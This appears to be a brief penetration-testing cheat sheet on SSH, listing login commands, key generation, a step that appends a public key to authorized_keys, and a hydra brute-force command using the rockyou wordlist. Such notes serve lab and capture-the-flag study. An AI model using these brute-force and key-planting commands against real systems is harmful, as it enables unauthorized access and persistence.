***SCP is always an option to copy is ssh is open***
***If you find creds, try them on SSH***
***Perhaps search for vulnerable versions but unlikely***
# ***Login***

```shell
ssh username@`tip` [ -p PORT ]
```

```shell
# w/ private key
chmod 400 priv_key
ssh -i priv_key USER@`tip` [ -p 2222 ]
```

# ***Generate Key***
```shell
ssh-keygen
cat fileup.pub > authorized_keys
```

# ***Bruteforce***
```shell
hydra -l dave -P /usr/share/wordlists/rockyou.txt ssh://`tip`
```


